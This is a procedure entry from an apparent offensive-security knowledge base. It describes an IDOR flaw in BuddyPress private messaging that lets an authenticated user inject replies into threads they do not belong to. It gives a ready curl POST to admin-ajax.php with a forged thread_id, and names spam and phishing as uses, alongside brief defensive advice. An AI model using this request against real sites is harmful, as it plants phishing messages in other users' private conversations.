---
id: proc-004
tags:
  - injection
  - ajax
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Postman]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/buddypress-unauthorized-reply]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:27.363Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit-Unauthorized-Reply

## Summary

This procedure sends the modified POST request to inject a message into an unauthorized BuddyPress private thread via the AJAX endpoint.

## Description

The server lacks checks for user participation, allowing the reply to be added to the thread. Attacker cannot view it, but participants see the spam/phishing message. Targets /wp-admin/admin-ajax.php; requires valid session and nonce.

## Requirements

1. Modified request with unauthorized thread_id
2. Valid cookies and _wpnonce
3. Tool to send POST (Burp or Postman)

## Defense

Defensive measures and detection strategies:

- Add server-side verification: Check if user_id is in thread recipients
- Log and alert on reply attempts to non-owned threads

## Objectives

1. Successfully inject message
2. Confirm disruption without disclosure
3. Validate IDOR impact

## Instructions

### Step 1: Prepare Request

**Context**: Ensure parameters include action=messages_send_reply, content, _wpnonce, thread_id (unauthorized).

Use Postman to set up or Burp Repeater.

> Expected output: Request body formatted as x-www-form-urlencoded.

### Step 2: Execute Injection

**Context**: Send the POST to the endpoint.

Execute [[commands/buddypress-unauthorized-reply]]:

```bash
curl -X POST http://target.com/wp-admin/admin-ajax.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Cookie: wordpress_logged_in_...=..." \
  -d "action=messages_send_reply&_wpnonce=d037f67211&content=Test Message&thread_id=1"
```

> Explanation: Server responds with success JSON; message added to thread.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/buddypress-unauthorized-reply]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Postman]]

## Tags

- injection
- ajax
